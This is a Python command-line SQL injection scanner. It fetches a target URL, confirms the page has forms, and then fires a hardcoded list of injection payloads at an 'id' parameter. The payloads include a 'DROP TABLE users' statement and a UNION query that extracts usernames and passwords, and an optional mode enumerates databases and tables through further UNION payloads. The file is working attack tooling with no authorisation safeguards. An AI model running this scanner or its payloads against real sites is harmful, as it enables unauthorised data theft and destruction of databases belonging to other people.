import requests
from urllib.parse import urljoin, urlparse, urlencode
import logging
from colorama import Fore, init
from bs4 import BeautifulSoup

# Initialize colorama for colored output
init(autoreset=True)

# Set up logging
logger = logging.getLogger()

class ColorizedFormatter(logging.Formatter):
    COLORS = {
        'INFO': Fore.GREEN,
        'WARNING': Fore.YELLOW,
        'ERROR': Fore.RED,
        'DEBUG': Fore.CYAN,
        'CRITICAL': Fore.RED + '[ CRITICAL ]' + Fore.RESET
    }

    def format(self, record):
        levelname = record.levelname
        color = self.COLORS.get(levelname, Fore.WHITE)
        record.levelname = f"{color}[{levelname}]{Fore.RESET}"  # Add color to log level
        return super().format(record)

# Set up logging configuration
console_handler = logging.StreamHandler()
console_handler.setFormatter(ColorizedFormatter('%(levelname)s - %(message)s'))
logger.addHandler(console_handler)
logger.setLevel(logging.INFO)

# SQL Injection payloads
SQLI_PAYLOADS = [
    "' OR 1=1 --",  # Common payload
    "' OR 'a'='a",  # Another common payload
    "'; DROP TABLE users --",  # Destructive payload
    "'; SELECT * FROM information_schema.tables --",  # List tables
    "' AND 1=2 --",  # False condition
    "' UNION SELECT null, username, password FROM users --"  # Union to get usernames and passwords
]

# Function to check for forms
def has_forms(url, session):
    try:
        response = session.get(url, timeout=10)
        if response.status_code == 200:
            soup = BeautifulSoup(response.text, 'html.parser')
            forms = soup.find_all('form')
            if forms:
                logger.info(f"[INFO] Forms detected on {url}. Proceeding with SQLi scan.")
                return True
            else:
                logger.warning(f"[INFO] No forms found on {url}. Unable to proceed with SQL injection scan.")
                return False
        else:
            logger.warning(f"[WARNING] Failed to fetch {url} - Status code: {response.status_code}")
            return False
    except requests.exceptions.RequestException as e:
        logger.critical(f"[CRITICAL] Error connecting to {url}: {str(e)}")
        return False

# SQL Injection scanning function
def scan_url(url, session, dbs=False):
    if has_forms(url, session):  # Proceed with scanning only if forms are found
        try:
            logger.info(f"Scanning: {url}")
            response = session.get(url, timeout=10)
            
            if response.status_code == 200:
                if dbs:
                    logger.info("Looking for databases...")
                    test_sqli_dbs(url, session)
                else:
                    for payload in SQLI_PAYLOADS:
                        test_sqli(url, payload, session)
            else:
                logger.warning(f"Failed to fetch {url} - Status code: {response.status_code}")
        except Exception as e:
            logger.critical(f"Critical error scanning {url}: {str(e)}")
    else:
        logger.critical(f"Unable to connect to target URL or no forms detected: {url}")

# Function to test SQL Injection vulnerabilities
def test_sqli(url, payload, session):
    # Ensure payload is correctly appended to the query string
    parsed_url = urlparse(url)
    query_string = urlencode({'id': payload})
    test_url = parsed_url._replace(query=query_string).geturl()
    
    try:
        response = session.get(test_url, timeout=10)
        
        if "error" in response.text.lower() or "syntax" in response.text.lower():
            logger.warning(f"Potential SQL Injection found on {url} with payload: {payload}")
        
        # Additional checks for specific error messages
        if "mysql" in response.text.lower() or "syntax error" in response.text.lower():
            logger.warning(f"Possible MySQL SQLi on {url} with payload: {payload}")
    except requests.exceptions.RequestException as e:
        logger.critical(f"Request failed for {url} with payload {payload}: {str(e)}")

# Function to test for databases
def test_sqli_dbs(url, session):
    db_payload = "' UNION SELECT null, database() --"
    try:
        response = session.get(f"{url}{db_payload}", timeout=10)
        if "error" not in response.text.lower():
            logger.info(f"Potentially retrieving databases from: {url}")
            retrieve_databases(url, session)
    except requests.exceptions.RequestException as e:
        logger.critical(f"Request failed for {url} with db payload: {str(e)}")

# Function to retrieve databases using SQL Injection
def retrieve_databases(url, session):
    db_enum_payload = "' UNION SELECT null, table_name FROM information_schema.tables --"
    try:
        response = session.get(f"{url}{db_enum_payload}", timeout=10)
        if "error" not in response.text.lower():
            logger.info(f"Databases retrieved from {url}: {response.text[:200]}")  # Display portion of result
    except requests.exceptions.RequestException as e:
        logger.critical(f"Request failed for {url} with enum db payload: {str(e)}")

# Main function to start the scanning
def main():
    import argparse
    
    parser = argparse.ArgumentParser(description="SQL Injection Scanner")
    parser.add_argument("-u", "--url", help="Target URL to scan", required=True)
    parser.add_argument("-dbs", "--databases", help="Enumerate SQL databases (default: False)", action="store_true")
    args = parser.parse_args()

    logger.info(f"Starting SQL Injection scan on {args.url}...")
    
    session = requests.Session()
    scan_url(args.url, session, args.databases)

if __name__ == "__main__":
    main()
